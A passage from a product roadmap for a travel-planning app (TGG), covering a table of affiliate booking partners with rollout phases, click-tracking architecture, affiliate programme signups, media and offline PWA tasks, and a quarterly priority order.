| 1   | **Flights**               | Skyscanner, Kayak, Kiwi.com, Google Flights | Launch   |
| 2   | **Accommodation**         | Booking.com, Airbnb, Hostelworld, Agoda     | Launch   |
| 3   | **Activities / tours**    | GetYourGuide, Viator, Klook, Tiqets         | Launch   |
| 4   | **Transport (intercity)** | Trainline, Omio, BlaBlaCar, Rome2Rio        | Phase 2  |
| 5   | **Car rental**            | Rentalcars.com, Discover Cars, Sixt         | Phase 2  |
| 6   | **Restaurants**           | TheFork, OpenTable, Resy                    | Phase 2  |
| 7   | **eSIM / mobile data**    | Airalo, Holafly, Nomad                      | Phase 2  |
| 8   | **Travel insurance**      | World Nomads, SafetyWing, Heymondo          | Phase 3  |
| 9   | **Visa / ESTA**           | Sherpa, iVisa                               | Phase 3  |
| 10  | **Local guides**          | ToursByLocals, Withlocals                   | Phase 3  |
| 11  | **Luggage storage**       | Bounce, Radical Storage                     | Phase 3  |
| 12  | **Airport transfers**     | Welcome Pickups, GetTransfer                | Phase 3  |
| 13  | **Travel SIM/data (alt)** | Airalo (already #7)                         | —        |
| 14  | **Currency / FX**         | Wise, Revolut (affiliate links)             | Phase 3  |

**Architecture:**

- [ ] New `module_clicks` table (user_id, trip_id, module, partner, clicked_at, deep_link_url) for analytics + affiliate attribution.
- [ ] `routes/modules.py` — one endpoint per category that takes (destination, dates, pax) and returns ranked partner cards with prebuilt deep-link URLs.
- [ ] Each card UI: partner logo, key prefilled params shown ("Lisbon → Tokyo · Sep 14-21 · 2 adults"), CTA button.
- [ ] Frontend: new `<TripModules>` React component placed on `pages/home/Home.tsx` (trip detail) AND `pages/ai/AI.tsx` (post-itinerary section).
- [ ] Each click logs to `module_clicks` + opens the deep link in a new tab.

**Affiliate program signups (the legwork — should start NOW even if implementation is later):**

- [ ] Skyscanner Partner Network — apply, get unique account, get deep-link API.
- [ ] Booking.com Affiliate Partner Programme — same.
- [ ] GetYourGuide Partner Program — same.
- [ ] Awin / CJ / Impact accounts (aggregators that cover Airbnb, Viator, Klook, Trainline, Wise, World Nomads, etc. through one dashboard).

**Why this fits TGG specifically:**

Generic travel sites have ads. TGG's edge: **the user is already telling you exactly what they need** by planning the trip. A "Book flights" card on a trip from Lisbon → Tokyo for Sep 14-21 with 2 companions doesn't feel like an ad — it feels like a tool that anticipates the next step. This is VISION's "organic business discovery" in its purest form.

**Why this comes AFTER 4.1-4.7:**

Without users, affiliate revenue is zero. The earlier features build the audience. Modules monetize it. **Don't ship Modules before you have users to click them.**

**A B2B alternative worth exploring in parallel:**

Per VISION's open question, target tourism companies (Abreu Viagens, etc.) as B2B customers: TGG becomes the platform they use to store + share trip data with their clients. They get a polished app without building one; you get users + recurring revenue. Easier to close pre-critical-mass than impression-based ads. **Worth a discovery call with 2-3 tour operators in Q3 2026.**

### 4.9 Trip media polish

**M** · `frontend/static/js/src/tripMedia.ts`

- [ ] Drag-to-reorder photos in trip detail (already requested).
- [ ] EXIF date → auto-assign photo to a trip day.
- [ ] Photo lightbox with swipe (mobile-first, reuses the swipe handler).

### 4.10 PWA install + offline trip detail

**M** · `frontend/static/sw.js`, manifest

- [ ] Real Workbox runtime cache for `/api/data` + `/static/uploads/` (stale-while-revalidate).
- [ ] Offline shell so a user mid-trip without signal can still view their itinerary.
- [ ] Install prompt only after second visit (don't annoy first-time visitors).

---

## What I'd do in what order (one-paragraph summary)

**This week:** ship 0.1, 0.2, 0.5, 0.6 (security critical) + 1.4 (SQLite WAL) — those are all small and dangerous-when-skipped.

**This month:** clear Phase 1. Critical security closure + the data-integrity bugs + the basic UX bugs that make the app feel rickety.

**This quarter:** ship 4.1 (share-via-link with cost banner + SSR/OG meta). Pair with 3.3 starting on Feed migration in the background. Apply for the Phase 1 affiliate programs (Skyscanner, Booking, GetYourGuide) NOW so credentials are ready when 4.8 lands.

**Next quarter:** 4.2 (Explore), 4.4 (Achievements), 4.5 (Settle Up). Then 4.8 launch phase 1 (flights + accommodation + activities) once traffic justifies it.

**Year 2:** 4.3 (multi-country), 4.7 (followers), 4.8 phases 2-3, B2B exploration with tour operators.

---

_This doc is the working source of truth. Update checkboxes as items ship. When items grow stale (3+ months without movement), drop them or note why they're parked._
